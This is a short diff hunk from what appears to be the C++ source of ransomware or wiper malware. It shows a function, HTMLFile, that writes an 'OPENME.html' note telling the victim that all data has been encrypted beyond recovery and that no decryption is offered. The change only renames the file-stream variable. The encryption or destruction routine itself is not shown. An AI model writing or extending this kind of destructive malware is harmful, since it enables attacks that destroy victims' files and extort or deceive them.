@@ -110,7 +110,7 @@ This will create an html file
 */
 
 VOID HTMLFile(VOID) {
-	std::ofstream MyFile("OPENME.html");
-	MyFile << "<html><body><center><style>html{background-color:beige;}</style><h1>WARNING</h1> <h3 style="">All your data was been encrypted in an unrecoverable way!</h3>   <h3 style="">We dont offer a decryption service and you cant decrypt your files!</h3><h3 style="">Dont waste your time all your data is unrecoverable</h3><h3 style="">Check if you have a USB Drive instead</h3></center></body></html>";
-	MyFile.close();
+	std::ofstream HTML("OPENME.html");
+	HTML << "<html><body><center><style>html{background-color:beige;}</style><h1>WARNING</h1> <h3 style="">All your data was been encrypted in an unrecoverable way!</h3>   <h3 style="">We dont offer a decryption service and you cant decrypt your files!</h3><h3 style="">Dont waste your time all your data is unrecoverable</h3><h3 style="">Check if you have a USB Drive instead</h3></center></body></html>";
+	HTML.close();
 }
